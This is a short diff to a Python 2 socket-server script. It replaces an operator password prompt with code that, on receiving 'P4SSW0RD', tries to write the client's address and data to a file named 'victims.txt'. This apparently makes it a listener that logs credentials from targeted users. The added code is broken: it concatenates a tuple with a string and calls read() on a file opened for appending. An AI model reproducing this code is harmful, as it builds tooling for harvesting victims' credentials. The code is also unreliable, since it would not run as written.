@@ -14,10 +14,11 @@ def sendcode(c,ac):
     data = c.recv(2048)
     if not data:
         pass
-    if data == "PAR0LA":
-        parola = raw_input("Enter Password : \n")
-        parola = parola.decode("utf-8")
-        sendcode(c,parola)
+    if data == "P4SSW0RD":
+        file = open("victims.txt","a")
+        passwd = c.getpeername() + ": " + data
+        file.read(passwd)
+        file.close()
     else:
         print data
 c,addr = client_socket.accept()
